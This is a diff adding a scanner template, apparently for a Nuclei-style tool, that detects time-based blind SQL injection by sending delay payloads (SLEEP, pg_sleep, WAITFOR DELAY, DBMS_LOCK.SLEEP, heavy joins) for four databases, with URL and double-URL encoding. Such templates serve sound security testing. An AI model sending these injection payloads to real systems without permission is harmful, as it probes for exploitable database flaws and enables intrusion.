@@ -1,0 +1,48 @@
+# templates/sqli/time-based-blind-sqli.yaml
+id: time-based-blind-sqli
+info:
+  name: Time-Based Blind SQL Injection Detection
+  author: webx-elite
+  severity: high
+  description: Detects blind SQL injection using time delay techniques
+  tags:
+    - sqli
+    - blind
+    - time-based
+  classification:
+    cwe-id: CWE-89
+
+vulnerability_type: sqli
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{sqli_payload}}"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+
+payloads:
+  # MySQL time delays
+  - "' OR SLEEP(5)--"
+  - "' AND SLEEP(5)--"
+  - "'; SELECT SLEEP(5)--"
+  - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+  
+  # PostgreSQL time delays
+  - "'; SELECT pg_sleep(5)--"
+  - "' AND pg_sleep(5)--"
+  - "1' AND 1=(SELECT COUNT(*) FROM pg_sleep(5))--"
+  
+  # SQL Server time delays
+  - "'; WAITFOR DELAY '00:00:05'--"
+  - "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--"
+  
+  # Oracle time delays
+  - "' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3)>0--"
+  - "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"
+
+encoders:
+  - url
+  - double_url
